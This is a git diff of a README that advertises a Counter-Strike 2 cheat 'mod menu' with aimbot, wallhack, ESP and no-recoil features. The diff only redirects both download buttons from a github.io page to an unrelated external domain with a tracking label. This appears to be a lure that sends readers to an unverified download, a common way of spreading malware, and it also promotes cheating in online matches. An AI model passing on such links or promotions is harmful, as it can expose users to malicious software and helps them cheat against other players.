@@ -2,7 +2,7 @@
 
 The **CS2 Mod Menu** provides a range of powerful features designed to give you a competitive edge in **Counter-Strike 2**. Whether you’re looking to improve your shooting accuracy, gain situational awareness with ESP, or simply have more control over your in-game actions, this mod menu offers tools to elevate your gaming experience. Unlock customizations like aimbots, wallhacks, no recoil, and more to maximize your performance on the battlefield.
 
-[![Download CS2 ModMenu](https://img.shields.io/badge/Download-CS2%20ModMenu-blueviolet)](https://cs2-mod-menu.github.io/.github/)
+[![Download CS2 ModMenu](https://img.shields.io/badge/Download-CS2%20ModMenu-blueviolet)](https://axesetcibles.com?label=884fbd91c9b088d242082409ec43d985)
 
 ## ⚡ Key Features
 
@@ -34,4 +34,4 @@ The **CS2 Mod Menu** provides a range of powerful features designed to give you 
 3. **Activate your preferred features** like aimbot, ESP, or no recoil, and customize the settings for optimal gameplay.
 4. **Enjoy the enhanced experience** with improved accuracy, better situational awareness, and more control during your matches.
 
-[![Download CS2 ModMenu](https://img.shields.io/badge/Download-CS2%20ModMenu-blueviolet)](https://cs2-mod-menu.github.io/.github/)
+[![Download CS2 ModMenu](https://img.shields.io/badge/Download-CS2%20ModMenu-blueviolet)](https://axesetcibles.com?label=884fbd91c9b088d242082409ec43d985)
